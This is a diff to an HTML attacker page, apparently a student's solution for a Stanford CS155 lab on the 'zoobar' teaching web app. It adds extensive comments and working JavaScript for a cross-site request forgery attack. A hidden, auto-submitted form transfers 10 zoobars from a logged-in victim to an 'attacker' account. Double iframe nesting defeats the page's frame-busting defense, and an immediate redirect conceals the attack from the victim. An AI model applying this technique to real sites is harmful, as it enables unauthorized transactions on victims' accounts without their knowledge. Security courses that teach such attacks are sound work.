@@ -11,12 +11,43 @@
 
 	<body>
 
+		<!-- Note: this attack works with the original version of transfer.php which includes framebusting defense code. -->
+
+		<!-- Main idea of exploit:
+			    This is a CSRF attack on zoobar. The victim will be assumed to have an active session with zoobar 
+			    when visiting the attacker page (this HTML page). The attacker page has a form that will make a
+			    post request to zoobar.stanford.edu/transfer.php with parameters to request a transfer of 10 
+			    zoobars destined to the 'attacker' account. When the victim visits this page the form will be hidden, 
+			    prefilled and automatically sent with JavaScript without victim action/awareness. The browser will
+			    send the victim's session-authentication cookies along with the HTTP POST request and will result 
+			    in a transfer of 10 zoobars from the victim's account to the attacker's. As soon as the post request
+			    succeeds the page will be redirected to crypto.stanford.edu/cs155. This is so quick that the victim 
+			    will believe he was only visiting crypto.stanford.edu/cs155.
+
+			    There is one technical difficulty in this attack. The transfer.php file in zoobar contains frame 
+			    busting code, which needs to be defeated. The defense is of the type:
+
+				if(top.location != self.location){
+                	parent.location = self.location;
+        		}
+				
+				In order to defeat this defense we use the double framing attack described in:
+				http://seclab.stanford.edu/websec/framebusting/framebust.pdf. We basically create a framewithin a 
+				frame and have the post target be the doubly nested frame. The frame busting defense will fail there.
+				We of course hide all of this from the user.
+		-->
+
+		<!-- First (outer) frame for the double framing attack -->
 		<iframe id='outerFrame' name='outerFrame'></iframe>
 		
 		<script type="text/javascript">
 		//<![CDATA[
-			// need id and name to match for iframe, otherwise Firefox will not post form to target iframe
-			// see: http://stackoverflow.com/questions/7083325/firefox-form-targetting-an-iframe-is-opening-new-tab
+			/* 
+			 * Second (inner) frame for the double framing attack + form that does the transfer and posts to 
+			 * inner form.
+			 * Note: need id and name to match for iframe, otherwise Firefox will not post form to target iframe
+			 * see: http://stackoverflow.com/questions/7083325/firefox-form-targetting-an-iframe-is-opening-new-tab
+			 */
 			var egg = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
 				"<form id='transferForm' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" +
 				"<input type='text' name='zoobars' value='10'>" +
@@ -28,16 +59,22 @@
 
 			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
 			
-			// Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. 
-			// See http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
+			/* 
+			 * Hack, trigger a page load, otherwise attack works in Chrome but not in Firefox. Without 
+			 * this the outerFrameDoc.body.innerHTML = egg; statement fails in Firefox.
+			 * See http://stackoverflow.com/questions/7828502/cannot-set-document-body-innerhtml-of-iframe-in-firefox
+			 */
 			outerFrameDoc.open();
 			outerFrameDoc.close();
-			//Set innerHTML of the body tag.
+			
+			/* Create the inner frame and form within the outer frame. */
 			outerFrameDoc.body.innerHTML = egg;
 			
+			/* Submit the transform form */
 			var transferForm = outerFrameDoc.body.children['transferForm'];
 			transferForm.submit();
 			
+			/* Wait 50ms for POST to succeed and redirect to crypto.stanford.edu/cs155 */
 			setTimeout( function(){ document.location.href="http://crypto.stanford.edu/cs155/" }, 50 );
 		//]]>
 		</script>
